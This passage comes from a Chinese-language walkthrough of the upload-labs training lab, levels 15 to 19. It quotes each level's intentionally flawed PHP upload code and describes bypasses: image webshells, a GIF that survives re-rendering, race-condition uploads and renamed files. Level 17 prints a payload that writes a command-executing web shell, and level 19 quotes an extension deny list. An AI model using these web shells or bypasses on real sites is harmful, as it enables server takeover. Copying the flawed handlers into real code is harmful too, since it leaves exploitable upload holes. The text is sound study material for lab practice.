class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>exif_imagetype — 判断一个图像的类型</p><blockquote><p>int exif_imagetype( string $filename)</p><blockquote><p>exif_imagetype() 读取一个图像的第一个字节并检查其签名</p></blockquote></blockquote></blockquote><p>这关还是直接上传图片马就OK了</p><h1 id="pass16"><a href="#pass16" class="headerlink" title="pass16"></a>pass16</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">'/'</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是jpg格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是png格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>imagecreatefromjpeg — 由文件或 URL 创建一个新图象</p></blockquote><blockquote><p>unlink — 删除文件</p></blockquote><p>这题像之前那样简单的上传图片马是行不通的,因为它会使用你上传的图片生成一张新的图片,也就是<strong>二次渲染</strong></p><p>看大佬的笔记之后,发现gif | jpg | png 3种不同后缀的图片分别对应不同的解决方法(好像只有gif是比较容易操作的)</p><h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>上传一张gif图,再把上传好的gif图下载,使用010editor软件对比</p><img src="/2019/08/10/upload-labs-master/16compare1.png"><p>可以看到灰色部分上传前后都是不变的,因此可以利用这点来写入代码</p><img src="/2019/08/10/upload-labs-master/16gifinsertcode.png"><p>上传后的图片的编码:</p><img src="/2019/08/10/upload-labs-master/16gifuploaded.png"><p>再配合文件包含食用</p><img src="/2019/08/10/upload-labs-master/16gifmethod.png"><h2 id="jpg-png"><a href="#jpg-png" class="headerlink" title="jpg/png"></a>jpg/png</h2><p>上传这两种文件的方法看了大佬的笔记,看起来比较麻烦,暂时不尝试了</p><p>上传jpg/png图片的方法可以参考<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a> –先知社区:Yang</p><h1 id="pass17"><a href="#pass17" class="headerlink" title="pass17"></a>pass17</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="法1-3"><a href="#法1-3" class="headerlink" title="法1"></a>法1</h2><p>解法像pass13那样上传图片马即可</p><h2 id="法2-3"><a href="#法2-3" class="headerlink" title="法2"></a>法2</h2><blockquote><p>move_uploaded_file — 将上传的文件移动到新位置</p><blockquote><p>bool move_uploaded_file( string $filename, string $destination)</p><blockquote><p>filename:上传的文件的文件名<br>destination:移动文件到这个位置</p></blockquote></blockquote></blockquote><p>因为move_uploaded_file函数在判断是否合法类型之前,所以可以采取竞争访问</p><p>直接抓包一个phpinfo的php文件,然后发送到intruder,payloads的payload sets的payload type选null payloads,payload options的generate后面填大的数字就行</p><img src="/2019/08/10/upload-labs-master/17intruder.png"><p>在跑的过程中可以不断访问网页来竞争</p><img src="/2019/08/10/upload-labs-master/17phpinfo.png"><p>也可以把phpinfo的代码换成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$c=fopen(<span class="string">'./cmd.php'</span>,<span class="string">'w'</span>);</span><br><span class="line">fwrite($c,<span class="string">'&lt;?php system($_GET["f"]);?&gt;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这样就等它跑完之后就会生成一个cmd.php文件,里面的代码就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">"f"</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这样就可以尝试GET一下了</p><img src="/2019/08/10/upload-labs-master/17cmd.png"><h1 id="pass18"><a href="#pass18" class="headerlink" title="pass18"></a>pass18</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"./myupload.php"</span>);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = <span class="keyword">new</span> MyUpload($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'size'</span>],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> ($status_code) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $msg = <span class="string">'文件已经被上传，但没有重命名。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            $msg = <span class="string">'这个文件不能上传到服务器的临时文件存储目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传目录不可写。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，无法上传该类型文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传的文件过大。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，服务器已经存在相同名称文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            $msg = <span class="string">'文件无法上传，文件不能复制到目标目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $msg = <span class="string">'未知错误！'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> $cls_arr_ext_accepted = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">".doc"</span>, <span class="string">".xls"</span>, <span class="string">".txt"</span>, <span class="string">".pdf"</span>, <span class="string">".gif"</span>, <span class="string">".jpg"</span>, <span class="string">".zip"</span>, <span class="string">".rar"</span>, <span class="string">".7z"</span>,<span class="string">".ppt"</span>,</span><br><span class="line">      <span class="string">".html"</span>, <span class="string">".xml"</span>, <span class="string">".tiff"</span>, <span class="string">".jpeg"</span>, <span class="string">".png"</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">( $dir )</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;setDir( $dir );</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">"SUCCESS"</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这题…源码很长</p><h2 id="法1-4"><a href="#法1-4" class="headerlink" title="法1"></a>法1</h2><p>直接一个phpinfo的php文件改后缀然后上传即可</p><img src="/2019/08/10/upload-labs-master/18phpinfo2.png"><h2 id="法2-4"><a href="#法2-4" class="headerlink" title="法2"></a>法2</h2><p>真图片最后加上phpinfo的代码</p><img src="/2019/08/10/upload-labs-master/18phpinfo.png"><h2 id="注意URL"><a href="#注意URL" class="headerlink" title="注意URL"></a>注意URL</h2><p>上传后的图片并不在upload文件夹里面</p><h2 id="法3-条件竞争图片马"><a href="#法3-条件竞争图片马" class="headerlink" title="法3 条件竞争图片马"></a>法3 条件竞争图片马</h2><p>这跟pass17一样使用brup来不断上传,由于条件竞争,程序会出现来不及rename最终上传成功</p><h1 id="pass19"><a href="#pass19" class="headerlink" title="pass19"></a>pass19</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="法1-5"><a href="#法1-5" class="headerlink" title="法1"></a>法1</h2><p>上传真图片,抓包加上phpinfo</p><img 